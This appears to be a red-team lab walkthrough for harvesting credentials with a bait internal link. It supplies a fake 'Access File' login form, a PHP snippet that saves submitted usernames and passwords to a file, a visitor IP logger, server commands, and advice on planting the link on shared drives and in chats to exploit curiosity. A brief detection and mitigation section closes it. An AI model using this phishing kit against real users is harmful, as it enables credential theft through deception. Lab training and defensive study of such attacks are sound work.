## **Law 8 — Make Others Come to You**

Interpretation (offensive context):  
Instead of pushing payloads, you **place a lure** and let targets initiate interaction. This reduces detection surface and increases perceived legitimacy.

---

# 🎯 Attack Scenario — _Credential Harvest via Passive Bait (Internal Resource Leak)_

You plant a **high-value-looking internal resource** and rely on curiosity + opportunism to pull users in.

**Persona (decoy owner):**

> _Olga Kuznetsova_, 20 y/o Finance Intern

---

# 🔴 Red Team Objective

- Achieve **victim-initiated compromise**
    
- Reduce:
    
    - outbound attack indicators
        
    - email-based detection
        

---

# 🖥️ Lab Setup

### VMs:

- **Kali (Attacker/Host)** — 3GB
    
- **Ubuntu Victim** — 2GB
    

### Network:

- Host-only
    

---

# ⚙️ Operator Workflow

## Phase 1 — Bait Creation

You create something that users **want to access without being asked**.

### Example bait:

- “Salary_Revision_2026.xlsx”
    
- “Bonus_List_Internal.pdf”
    
- “Confidential_Performance_Report”
    

👉 High curiosity + perceived value

---

## Phase 2 — Hosting the Lure

On Kali:

```bash
mkdir bait && cd bait
```

Create landing page:

```html
<form action="login.php" method="POST">
<input name="user" placeholder="Email">
<input type="password" name="pass" placeholder="Password">
<button>Access File</button>
</form>
```

```php
<?php
file_put_contents("creds.txt", $_POST['user']." ".$_POST['pass']."\n", FILE_APPEND);
?>
```

---

### Start server:

```bash
php -S 0.0.0.0:8080
```

---

## Phase 3 — Placement (Critical Step)

You **don’t send emails**

Instead, simulate:

- shared internal location
    
- exposed link
    

Example placement methods (lab simulation):

- leave link in:
    
    - shared document file
        
    - internal notes
        
    - chat message history
        

Example:

```text
Finance shared drive link:
http://192.168.56.101:8080
```

---

## Phase 4 — Victim Initiation

Target:

- discovers link
    
- clicks voluntarily
    
- logs in to “access file”
    

👉 No coercion  
👉 No suspicion trigger

---

## Phase 5 — Expected Result

- Credentials captured passively
    
- No direct attacker interaction
    

👉 This is **pull-based exploitation**

---

# 🛠️ Tooling + Commands

### Core:

```bash
php -S 0.0.0.0:8080
```

---

### Optional (enhanced realism)

Rename page to mimic file access:

```bash
mv index.html salary_portal.html
```

---

### Track access:

```php
<?php
file_put_contents("visitors.txt", $_SERVER['REMOTE_ADDR']."\n", FILE_APPEND);
?>
```

---

# 🧠 Social Engineering Mapping (Hadnagy)

Relevant concepts:

- **Curiosity exploitation**
    
- **Scarcity / exclusivity**
    
- **Self-initiated trust**
    

Key principle:

> People trust what they choose to access

---

# 🛡️ Detection & Defensive Insight

Why this is dangerous:

- no phishing email
    
- no obvious trigger event
    

Indicators:

- access to unknown internal links
    
- login prompts for file access
    
- unusual internal resource naming
    

Mitigation:

- restrict access to sensitive filenames
    
- monitor:
    
    - internal link access patterns
        
- enforce:
    
    - authenticated file sharing systems only
        

---

# 📄 Report Artifact

### Title:

> Passive Credential Harvest via Internal Bait Placement

### Include:

- bait file naming strategy
    
- access logs
    
- credential capture evidence
    
- analysis:
    
    - why victim initiated action
        
- impact:
    
    - stealth compromise without active delivery
        

---

# ⚠️ Operator Insight

Push attacks:

- detectable
    
- noisy
    

Pull attacks:

- silent
    
- scalable
    
- harder to trace
    

You’re not forcing interaction  
You’re **creating temptation**

---

